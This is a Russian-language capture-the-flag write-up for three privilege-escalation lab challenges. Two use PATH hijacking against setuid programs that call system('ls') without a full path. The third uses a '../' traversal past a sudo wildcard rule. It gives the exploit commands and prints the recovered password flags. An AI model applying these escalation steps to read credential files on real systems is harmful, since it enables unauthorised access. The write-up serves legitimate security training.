App-Script/Bash-System-1
```c
#include <stdlib.h>  
#include <sys/types.h>
#include <unistd.h>
int main(void)    
{    
setreuid(geteuid(), geteuid());    
system("ls /challenge/app-script/ch11/.passwd");    
return 0;    
}
```

Ошибка заключается в передаче относительного имени программы (ls) вместо абсолютного пути (например, /bin/ls). Функция system() инициирует выполнение через вызов оболочки `/bin/sh -c`. При отсутствии абсолютного пути оболочка производит поиск исполняемого файла, опираясь на переменную окружения PATH. Поскольку дочерний процесс полностью наследует переменные окружения от вызывающего процесса, вектор выполнения становится подконтрольным пользователю.  
Наша цель состоит в том, чтобы осуществить перехват потока выполнения, заставив привилегированный процесс выполнить пользовательский скрипт.

mkdir /tmp/aaa -> cp /bin/cat /tmp/aaa -> mv cat ls -> export PATH=/tmp/aaa:$PATH -> ./ch11 -> !oPe96a/.s8d5 (подменили команду ls в 7 строке на cat)

Bash - System 2
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
```
та же идея что и в system1, но теперь нужно написать скрипт, который подставляется в ls. Например:
```bash
#!/bin/bash
cat /challenge/app-script/ch12/.passwd #
```
./ch12 -> 8a95eDS/\*e_T#

sudo - weak configuration
sudo -ll -> 
```
User app-script-ch1 may run the following commands on challenge02:

Sudoers entry:
    RunAsUsers: app-script-ch1-cracked
    Commands:
        /bin/cat /challenge/app-script/ch1/notes/*
```
-> нам можно выполнять команды cat на пути /challenge/app-script/ch1/notes/* от пользователя app-script-ch1-cracked -> проверка идёт только на то что передаваемая команда cat выводит по пути начинающемуся с /challenge/app-script/ch1/notes/ -> sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd -> b3_c4r3ful_w1th_sud0

.. здесь как cd ..


